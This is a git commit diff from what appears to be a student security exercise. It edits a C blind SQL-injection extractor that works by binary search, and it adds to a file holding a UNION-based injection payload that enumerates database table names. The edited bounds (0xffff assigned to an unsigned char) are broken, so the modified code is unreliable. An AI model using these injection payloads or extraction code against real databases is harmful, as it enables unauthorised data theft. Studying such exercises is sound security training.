1cfa96062bc2abd4b0e52cd99e8af6cce3da9882
Michael Terkeltoub <michael.terkeltoub@mail.huji.ac.il>
2026-01-15 09:34:51 +0200

    1

--- attacker/ex4_sqli.c
+++ attacker/ex4_sqli.c
@@ -373,7 +373,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
         printf("%i--\n", i);
     #endif
         unsigned char low = 0;
-        unsigned char high = 0x5f;
+        unsigned char high = 0xffff;
         unsigned char mid;
         while (low < high) {
             mid = (unsigned char)(low + (high - low) / 2);
@@ -391,7 +391,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
             printf("\t%s,%c,%c\n", gen_ctx->discovered, low + 0x20, high + 0x20);
         #endif
         }
-        if (low>0x5e) {
+        if (low>0xfffe) {
             #ifdef __MY_DEBUG__
                 puts("String shorter than max.");
             #endif
--- query.sql
+++ query.sql
@@ -1,3 +1,13 @@
 order_id=0 UNION SELECT table_name
 FROM information_schema.TABLES
 WHERE table_name LIKE '%usr%' AND table_name LIKE 'a%' LIMIT 1;
+
+SELECT
+    table_schema AS database_name,
+    table_name
+FROM
+    information_schema.tables
+WHERE
+    table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
+ORDER BY
+    table_name;
